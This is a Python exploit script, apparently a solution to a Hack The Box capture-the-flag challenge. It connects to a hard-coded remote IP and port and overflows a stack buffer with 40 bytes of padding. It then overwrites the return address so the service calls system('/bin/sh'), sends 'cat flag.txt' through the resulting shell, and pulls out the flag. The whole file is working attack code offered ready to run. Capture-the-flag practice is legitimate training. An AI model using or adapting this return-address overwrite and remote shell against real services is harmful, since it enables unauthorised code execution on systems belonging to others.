import socket
import struct
import re
import time

# Remote connection details
HOST = '164.92.187.197'
PORT = 32757

def p64(address):
    """Packs a 64-bit address into bytes (little-endian)."""
    return struct.pack("<Q", address)

def exploit():
    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Receive initial banner until the prompt
    # We need to read byte by byte until we see the prompt
    # Or read in chunks and check for the prompt
    buffer = b""
    while b'$ ' not in buffer:
        try:
            chunk = s.recv(1)
            if not chunk:
                print("[-] Connection closed prematurely.")
                return
            buffer += chunk
        except socket.timeout:
            print("[-] Socket timeout while waiting for prompt.")
            return
    print(f"[+] Received prompt: {buffer.decode(errors='ignore').strip()}")

    # Payload construction
    # Offset to RIP is 40 bytes
    offset = 40
    # Address of the instruction sequence that calls system(\"/bin/sh\")
    target_address = 0x401758

    payload = b'A' * offset  # Padding
    payload += p64(target_address) # Overwrite RIP with target address

    print(f"[*] Sending payload: {payload}")
    s.sendall(payload + b'\n') # Add newline for sendline behavior

    # Give the shell some time to spawn and process the command
    time.sleep(0.5)

    # Send 'cat flag.txt' command
    print("[*] Sending 'cat flag.txt' command")
    s.sendall(b'cat flag.txt\n')

    # Receive all remaining data
    print("[*] Receiving all output...")
    full_output = b""
    s.settimeout(1) # Set a timeout for receiving data
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            full_output += data
        except socket.timeout:
            break
    s.close()

    print(f"[+] Full output received:\n{full_output.decode(errors='ignore')}")

    # Extract the flag
    flag_match = re.search(r'HTB{[^}]+}', full_output.decode(errors='ignore'))
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] Flag found: {flag}")
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[+] Flag saved to flag.txt")
    else:
        print("[-] Flag not found in the output.")

if __name__ == "__main__":
    exploit()